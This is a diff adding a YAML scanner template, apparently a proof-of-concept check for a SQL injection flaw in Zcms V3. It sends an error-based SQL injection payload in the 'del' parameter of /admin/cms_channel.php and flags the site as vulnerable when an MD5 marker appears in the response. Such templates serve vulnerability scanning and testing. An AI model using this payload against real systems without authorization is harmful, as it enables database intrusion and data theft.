@@ -1,0 +1,21 @@
+id: poc-yaml-zcms-v3-sqli
+info:
+  name: Zcms V3 SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: Zcms V3
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5(202072102)%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "6f7c6dcbc380aac3bcba1f9fccec991e")
+  output: []
